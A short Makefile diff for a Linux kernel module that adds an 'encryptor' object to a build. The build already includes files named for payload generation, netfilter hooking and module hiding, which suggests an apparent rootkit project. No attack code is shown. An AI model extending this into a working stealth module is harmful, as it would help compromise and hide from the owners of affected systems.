@@ -13,6 +13,7 @@ $(MODULENAME)-y += src/fs/payload_generator.o
 $(MODULENAME)-y += src/net/netfilter.o src/net/checksum.o
 $(MODULENAME)-y += src/core.o src/init.o
 $(MODULENAME)-y += src/utils/hiders/hide_module.o 
+$(MODULENAME)-y += src/utils/modifiers/encryptor.o 
 
 KBUILD_CFLAGS := $(filter-out -pg,$(KBUILD_CFLAGS))
 KBUILD_CFLAGS := $(filter-out -mfentry,$(KBUILD_CFLAGS))
